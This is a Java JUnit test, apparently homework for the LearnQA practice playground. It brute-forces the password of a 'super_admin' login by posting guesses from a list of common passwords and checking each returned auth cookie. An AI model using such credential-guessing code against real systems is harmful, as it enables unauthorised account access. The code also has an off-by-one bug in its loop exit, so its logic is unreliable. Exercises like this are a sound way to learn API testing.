package old;

import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;
import io.restassured.response.Response;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class TestGetPassword{
    @Test
    public void testGetPassword() {

        String[] passwords = new String[]{"password","123456","12345678","qwerty","abc123","monkey","1234567","letmein","trustno1","dragon","baseball",
                "111111","iloveyou","master","sunshine","ashley","bailey","passw0rd","shadow","123123","654321","superman","qazwsx","michael","Football","welcome",
                "jesus","ninja","mustang","password1","123456789","adobe123","admin","1234567890","photoshop","1234","12345","princess","azerty","0","access",
                "696969","batman","1qaz2wsx","login","qwertyuiop","solo","starwars","121212","flower","hottie","loveme","zaq1zaq1","hello","freedom","whatever",
                "666666","654321","!@#$%^&*","charlie","aa123456","donald","qwerty123","1q2w3e4r","555555","lovely","7777777","888888","123qwe"};
        int i =0;
        boolean searchPassword=true;

        do {
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", passwords[i]);

            Response responseForGet = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            //response.prettyPrint();
            String responseCookie = responseForGet.getCookie("auth_cookie");
            System.out.println(responseCookie);

            Map<String,String> cookies = new HashMap<>();
            cookies.put("auth_cookie",responseCookie);

            Response responseForCheck = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            System.out.println(responseForCheck.getBody().asString());

            if (Objects.equals(responseForCheck.getBody().asString(), "You are NOT authorized"))
            {
                if(i<passwords.length)
                {
                    i++;
                }
                else
                {
                    searchPassword=false;
                    System.out.println("Нет правильного пароля");
                }
            }
            else
            {
                searchPassword=false;
                System.out.println("Пароль: "+passwords[i]);
            }
        }
        while(searchPassword);
    }
}
